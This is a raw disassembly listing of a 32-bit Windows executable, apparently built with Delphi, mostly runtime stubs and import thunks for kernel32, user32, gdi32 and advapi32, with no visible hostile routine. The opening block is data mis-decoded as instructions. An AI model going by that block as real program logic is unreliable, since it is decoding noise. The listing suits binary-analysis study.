test [ edx ] r-xdata
pop eax
mov bh 0x42
add [ eax ] ch
mov bh 0x42
add [ eax ] ah
mov bh 0x42
add al dh
mov dh 0x42
add [ eax + 0x26 ] al
inc ebx
add al bh
and eax 0x26a80043
inc ebx
add [ eax + 0x26 ] ah
inc ebx
add [ eax + 0x48004325 ] al
and eax 0x25d80043
inc ebx
add [ eax + 0x6c004325 ] ch
inc [ edx ]
cmp al 0xfe
inc edx
add ah ah
std
inc edx
add [ eax - 0x13ffbd03 ] ch
xchg esp eax
inc ebx
add [ esp + edx * 4 + 0x27140043 ] bh
inc ebx
add ah al
inc ebx
add [ edi + 0x43 ] ch
add [ edi ] bl
inc ebx
add [ eax + 0x680042f7 ] bl
test [ edx ] sub_432924
lodsb [ esi ]
sub [ ebx ] al
adc al 0x35
inc ebx
add al dl
xor al 0x43
add ah dl
mov ah 0x44
add [ esp + esi * 4 + 0x44 ] ch
add ah cl
mov [ eax + eax - 0x64 ] 0xb80044c7
mov eax [ 0xffffffffa1400043 ]
inc ebx
add [ eax + 0x500042ab ] al
stosd [ edi ]
inc edx
add al dl
pop ss
inc esi
add [ edi + edx + 0x46 ] dh
add al dl
inc esi
add [ eax - 0x17ffb9da ] ah
and eax [ esi ]
mov eax 0x94004623
push ebx
inc esi
add [ ebx + edx * 2 + 0x46 ] ah
add al dh
aaa
inc esi
add [ eax + 0x30004637 ] bh
cmp [ esi ] al
add [ eax ] bh
inc esi
add [ eax ] bh
push ebx
inc esi
add ah dh
push edx
inc esi
add [ edx + ebx * 2 + 0x46 ] ah
add [ eax + 0x48004659 ] ch
inc edx
inc esi
add [ eax ] bl
inc edx
inc esi
add [ eax + 0x5c ] bh
inc esi
add [ eax + 0x5c ] cl
inc esi
add [ edi + ebx * 2 + 0x46 ] ah
add [ edi + ebx * 2 ] dh
inc esi
add [ ebp + 0x65440046 ] cl
inc esi
add [ eax + edi * 2 + 0x46 ] ch
add [ eax + edi * 2 ] bh
inc esi
add [ edx + esi * 2 + 0x72740046 ] ah
inc esi
add [ edi + edi * 2 + 0x7f740046 ] ah
inc esi
add ah bh
mov al [ esi ]
int3
add [ eax + 0x30004146 ] ch
inc esi
inc ecx
add [ eax + ecx * 2 + 0x487c0041 ] ch
inc ecx
add al ch
push eax
inc ecx
add [ eax - 0x4fffbeb0 ] bl
stc
inc ecx
add [ eax ] al
stc
inc ecx
add [ eax + 0x5000428c ] al
mov [ edx ] es
cmp [ edi - 0x70f7ffbe ] cl
inc edx
add ah ch
cmpsd [ esi ] [ edi ]
inc edx
add [ edi - 0x684bffbe ] ch
inc edx
add [ edi + edx * 4 - 0x6fcbffbe ] al
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax sub_485dac
call sub_40604c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460274
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46028c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46030c
call sub_403dcc
sub_40115f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4059a4
sub_401169
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4059b8
sub_40122c
jmp [ __import_lookup_table_1(user32:CharNextA) ]
sub_401234
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ __import_lookup_table_0(kernel32:ExitThread) ]
ExitProcess
jmp [ ExitProcess@IAT ]
sub_40124c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401284
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_4012ac
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012cc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_4012ec
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_401314
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40132c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ad2
jmp sub_4038c0
sub_401ad9
mov al [ rw-data ]
pop ebp
retn
sub_401bb6
jmp sub_4038c0
sub_401c84
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402298
retn
sub_402284
jmp sub_4038c0
sub_40242a
jmp sub_4038c0
sub_4026c9
jmp sub_4038c0
sub_40278c
call sub_406000
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_406000
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027e0
mov [ rw-data ] edx
call sub_403ea4
sub_402844
push eax
push edx
push ecx
call sub_406000
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402838
retn
sub_402860
retn
sub_4028b4
retn
sub_4028b8
push ebx
call sub_406000
mov ebx [ eax + 0x4 ]
call sub_406000
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402924
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402934
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_4029d0
mov edx [ eax + 0x1c ]
call sub_402988
retn
sub_402a63
retn
sub_402a64
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4028d8
retn
sub_402c74
mov ecx 0xff
call sub_402c80
retn
sub_402ca4
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402cc0
jmp sub_402cc0
sub_402cbd
retn
sub_40304d
jmp sub_4038c0
sub_4030a0
fninit
fwait
fldcw [ rw-data ]
retn
sub_4030f8
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403104
push ebx
mov ebx eax
mov eax ebx
call sub_403134
call sub_4026dc
mov edx eax
mov eax ebx
call sub_403178
pop ebx
retn
sub_403120
push ebx
mov ebx eax
mov eax ebx
call sub_4031d0
mov eax ebx
call sub_4026fc
pop ebx
retn
sub_403134
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_40315c
call sub_4034f8
test dl dl
jle r-xdata
retn
call sub_4034e0
sub_40321c
retn
sub_4032a4
jmp sub_4038c0
sub_4032ab
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4033b4
mov eax 0x8000ffff
retn
sub_4033bc
retn
sub_4033c0
retn
sub_4033c4
retn
sub_4034b9
jmp sub_40360c
sub_4034be
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403920
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4034e0
sub_4034e0
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4034e8
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4034f8
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403508
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4035d0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4035ec
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_4039b9
retn
sub_403afc
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403b8a
jmp sub_40360c
sub_403bea
jmp sub_40360c
sub_403c04
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403afc
mov [ rw-data ] 0x0
call sub_403ba4
retn
sub_403d3d
retn
sub_403e9f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403ea4
mov [ rw-data ] eax
call sub_403dcc
sub_403f38
push eax
call ExitThread
sub_404164
retn
sub_4041a0
retn
sub_4041ae
retn
sub_4041c7
retn
sub_4041d8
retn
sub_4042bf
retn
sub_4043f0
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_40440c#2
jmp sub_40440c
sub_404455
retn
sub_40445d
retn
sub_40449f
retn
sub_4045f8
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
sub_404610
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404768
retn
sub_40477a
retn
sub_40477c
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404970
mov ecx 0x1
jmp sub_4048dc
sub_40497a
retn
sub_4049b0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402838
call [ rw-data ]
retn
sub_404ab4
mov ecx 0x1
jmp sub_4049c8
sub_404abe
retn
sub_404ac0
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402838
call [ rw-data ]
retn
sub_404ce6
retn
sub_404ce8
push edx
call sub_4026dc
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404970
pop eax
sub_404cfc
push eax
call sub_404ab4
pop eax
call sub_4026fc
retn
sub_404d0c
mov al 0x11
jmp sub_402838
sub_404d37
retn
sub_404f78
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404bf4
pop ebp
retn 0x4
j_sub_4049c8
jmp sub_4049c8
sub_404f8d
retn
sub_404f90
call sub_405224
retn
sub_4052b0
call sub_405288
retn
sub_4055f9
jmp sub_4038c0
sub_405764
call sub_405774
retn
sub_40576c
call sub_405794
retn
sub_405774
push ebx
mov ebx eax
mov eax 0x8
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_40582f
jmp sub_40360c
sub_405850
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4058c4
jmp sub_4038c0
sub_4058cb
pop ecx
pop ebp
retn
sub_405944
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405950
add eax 0x4
push eax
call sub_401314
retn
sub_40595c
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402838
sub_40596c
call sub_403104
mov [ eax + 0x4 ] 0x1
retn
sub_4059a4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_40130c
pop ebp
retn 0x4
sub_405c93
jmp sub_4038c0
sub_405c9a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d37
jmp sub_4038c0
sub_405d3e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d87
jmp sub_4038c0
sub_405d8e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405e52
jmp sub_4038c0
sub_405e59
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405eaa
jmp sub_4038c0
sub_405eb1
pop ebp
retn
sub_405f88
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405fa8
push eax
push 0x40
call LocalAlloc
retn
sub_405fb4
mov eax 0x10
retn
sub_406040
mov eax rw-data
call sub_405850
retn
sub_4060b5
jmp sub_4038c0
sub_4060bc
pop ebp
retn
sub_4060c0
sub [ rw-data ] 0x1
retn
sub_4060c8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_4060e4
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_40612d
jmp sub_4038c0
sub_406134
pop ebp
retn
sub_406138
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ CreateThread@IAT ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ __import_lookup_table_6(kernel32:FindClose) ]
FindFirstFileA
jmp [ FindFirstFileA@IAT ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InterlockedIncrement
jmp [ InterlockedIncrement@IAT ]
FreeResource
jmp [ FreeResource@IAT ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ __import_lookup_table_6(kernel32:GlobalFree) ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ LeaveCriticalSection@IAT ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
ResumeThread
jmp [ ResumeThread@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ __import_lookup_table_6(kernel32:SetThreadLocale) ]
SetThreadPriority
jmp [ __import_lookup_table_6(kernel32:SetThreadPriority) ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_40643c
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
SuspendThread
jmp [ SuspendThread@IAT ]
VirtualAlloc
jmp [ VirtualAlloc@IAT ]
VirtualFree
jmp [ VirtualFree@IAT ]
VirtualProtect
jmp [ VirtualProtect@IAT ]
VirtualQuery
jmp [ VirtualQuery@IAT ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtCreatePen
jmp [ ExtCreatePen@IAT ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetClipRgn
jmp [ __import_lookup_table_8(gdi32:GetClipRgn) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ __import_lookup_table_8(gdi32:GetEnhMetaFileHeader) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ __import_lookup_table_8(gdi32:PlayEnhMetaFile) ]
PolyPolyline
jmp [ __import_lookup_table_8(gdi32:PolyPolyline) ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
ScaleViewportExtEx
jmp [ ScaleViewportExtEx@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetEnhMetaFileBits
jmp [ __import_lookup_table_8(gdi32:SetEnhMetaFileBits) ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharLowerBuffA
jmp [ CharLowerBuffA@IAT ]
CharNextA
jmp [ CharNextA@IAT ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CharUpperBuffA
jmp [ __import_lookup_table_9(user32:CharUpperBuffA) ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CloseClipboard
jmp [ CloseClipboard@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ CreatePopupMenu@IAT ]
DefFrameProcA
jmp [ __import_lookup_table_9(user32:DefFrameProcA) ]
DefMDIChildProcA
jmp [ __import_lookup_table_9(user32:DefMDIChildProcA) ]
DefWindowProcA
jmp [ __import_lookup_table_9(user32:DefWindowProcA) ]
DestroyIcon
jmp [ __import_lookup_table_9(user32:DestroyIcon) ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ DispatchMessageA@IAT ]
DrawFrameControl
jmp [ DrawFrameControl@IAT ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EmptyClipboard
jmp [ __import_lookup_table_9(user32:EmptyClipboard) ]
EnableScrollBar
jmp [ __import_lookup_table_9(user32:EnableScrollBar) ]
EnableWindow
jmp [ EnableWindow@IAT ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ EqualRect@IAT ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetCaretPos
jmp [ GetCaretPos@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetDoubleClickTime
jmp [ GetDoubleClickTime@IAT ]
GetForegroundWindow
jmp [ __import_lookup_table_9(user32:GetForegroundWindow) ]
GetIconInfo
jmp [ __import_lookup_table_9(user32:GetIconInfo) ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ GetMenuItemInfoA@IAT ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
GetMessageTime
jmp [ GetMessageTime@IAT ]
__imp_GetWindow
jmp [ GetWindow@IAT ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetScrollInfo
jmp [ __import_lookup_table_9(user32:GetScrollInfo) ]
GetScrollPos
jmp [ __import_lookup_table_9(user32:GetScrollPos) ]
GetScrollRange
jmp [ GetScrollRange@IAT ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ __import_lookup_table_9(user32:GetSystemMenu) ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindow
jmp [ GetWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ GetWindowPlacement@IAT ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ GetWindowTextA@IAT ]
__imp_GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
GetWindowThreadProcessId
jmp [ GetWindowThreadProcessId@IAT ]
InflateRect
jmp [ InflateRect@IAT ]
InsertMenuItemA
jmp [ __import_lookup_table_9(user32:InsertMenuItemA) ]
IsCharAlphaNumericA
jmp [ __import_lookup_table_9(user32:IsCharAlphaNumericA) ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ IsRectEmpty@IAT ]
IsWindow
jmp [ IsWindow@IAT ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ IsZoomed@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBeep
jmp [ __import_lookup_table_9(user32:MessageBeep) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
OpenClipboard
jmp [ OpenClipboard@IAT ]
PeekMessageA
jmp [ PeekMessageA@IAT ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
RedrawWindow
jmp [ RedrawWindow@IAT ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ SetCapture@IAT ]
SetClassLongA
jmp [ SetClassLongA@IAT ]
SetForegroundWindow
jmp [ SetForegroundWindow@IAT ]
SetKeyboardState
jmp [ __import_lookup_table_9(user32:SetKeyboardState) ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetScrollInfo
jmp [ SetScrollInfo@IAT ]
SetScrollPos
jmp [ __import_lookup_table_9(user32:SetScrollPos) ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ __import_lookup_table_9(user32:SetWindowTextA) ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ __import_lookup_table_9(user32:ShowCursor) ]
ShowOwnedPopups
jmp [ __import_lookup_table_9(user32:ShowOwnedPopups) ]
ShowScrollBar
jmp [ __import_lookup_table_9(user32:ShowScrollBar) ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnionRect
jmp [ UnionRect@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_406c80
call GetTickCount
retn
sub_406c88
xor eax eax
retn
sub_406c8c
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406c9c
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406cb8
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
